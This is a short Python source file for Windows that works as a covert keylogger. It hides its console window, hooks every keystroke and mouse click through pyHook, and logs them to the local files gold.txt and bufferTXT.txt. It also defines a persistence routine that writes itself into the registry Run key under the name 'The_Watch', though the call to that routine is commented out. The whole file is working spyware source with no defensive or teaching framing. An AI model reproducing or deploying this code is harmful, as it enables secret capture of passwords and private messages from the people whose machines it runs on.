__author__ = "Remigius Kalimba"

import pythoncom
import pyHook
import os, sys
from _winreg import *
buffer = []

#Hide
def hide():
    import win32console, win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change= OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
    SetValueEx(key2change, "The_Watch",0,REG_SZ, new_file_path)

def OnKeyboardEvent(event):
    with open("gold.txt", "a") as writer:
        if event.KeyID != 13:
            buffer.append(chr(event.Ascii))
            writer.write(chr(event.Ascii))
        if event.KeyID == 8:
            buffer.append("BackSpace")
            writer.write("BackSpace")
        elif event.KeyID == 13:
            buffer.append("\n")
            with open("bufferTXT.txt", 'a') as buffwritter:
                buffwritter.writelines(buffer)
                del buffer[:]
    return True

def onClick(event):
    with open("gold.txt", "a") as writer:
        mouseClick = event.Position
        writer.write("\n"+str(mouseClick))
    return True

hide()
#addStartup()
manager = pyHook.HookManager()
manager.KeyDown = OnKeyboardEvent
manager.HookKeyboard()
manager.SubscribeMouseAllButtonsDown(onClick)
manager.HookMouse()
pythoncom.PumpMessages()
manager.UnhookMouse()
manager.UnhookKeyboard()